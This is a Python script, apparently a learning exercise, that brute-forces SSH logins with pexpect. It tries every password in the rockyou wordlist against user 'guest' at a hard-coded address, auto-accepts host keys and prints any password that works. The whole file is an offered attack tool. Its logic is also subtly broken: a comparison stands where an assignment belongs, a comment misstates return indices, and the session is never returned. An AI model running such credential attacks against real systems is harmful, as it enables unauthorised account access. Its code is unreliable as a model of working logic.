#While importing modules, python first checks the present directory, then standard modules then the folders
# specifed in paths. So, if I name the script as pexpect, then the first statement import pexpect will import 
# this file, not the pexpect module from the folder specified in path


import pexpect
#import argparse

PROMPT = ['#',':','>>>','>']

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    child = pexpect.spawn(f'ssh {user}@{host}')

    #After spawing a new ssh process, we must anticipate the kinds of responses. These reseponses should be
    # placed in an array of the expect() function. The function will return the index of the matched value. 
    # so if  TIMEOUT is returned, ret will be 1, ssh_newkey then 2 and Password or Password then 3. Expectations 
    # can be specified in regex.
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])

    if ret == 0:
        print(f'[-] Error: Connection Timeout')
        return 0
    if ret == 1:
        #Automatically accept the new fingerprint
        child.sendline('yes')
        retnew = child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
        if retnew == 0:
            print(f'[-] Error: Connection Timeout')
            return 0
        if retnew == 1:
            ret == 2     
    if ret == 2:
        child.sendline(password)
        connection = child.expect(['[p|P]ermission denied', 'Last Login'])
        if connection == 0:
            return 0
        if connection == 1:
            print(f'The password: {password} for user {user} succeded')
            return 1

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def main():
    host = '192.168.0.114'
    user = 'guest'
    
    passwordFilePath = '/usr/share/wordlists/rockyou.txt'

    #The open file function return an array of lines
    with open(passwordFilePath,'r') as pf:
        for password in pf:
            password = password.replace('\n','')
            print(f'Trying {password} for {user}')
            connect(user, host, password)
    #send_command(sshConnection, 'pwd')

if __name__ == '__main__':
    main()